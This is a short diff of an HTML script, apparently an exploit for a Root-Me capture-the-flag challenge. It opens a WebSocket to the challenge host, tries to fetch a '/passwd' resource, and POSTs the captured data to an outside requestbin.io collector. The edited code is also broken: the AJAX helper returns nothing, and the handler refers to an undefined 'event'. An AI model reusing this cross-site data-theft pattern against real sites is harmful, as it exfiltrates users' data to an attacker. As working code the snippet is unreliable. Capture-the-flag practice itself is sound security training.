@@ -4,11 +4,11 @@
   <script>
     websocket = new WebSocket('ws://ctf02.root-me.org/ws');
     websocket.onopen = start
-    websocket.onmessage = handleReply
-    function start(event) {
-      websocket.send("attackers-message");
+    function getdata(){
+      $.ajax({ url: 'http://ctf02.root-me.org/passwd', success: function(data) { return data } });
     }
-    function handleReply(event) {
+    let data = getdata()
+    function start(data) {
       fetch('https://requestbin.io/1cyce261', {method:'POST',mode:'no-cors',body:event.data})
     }
   </script>
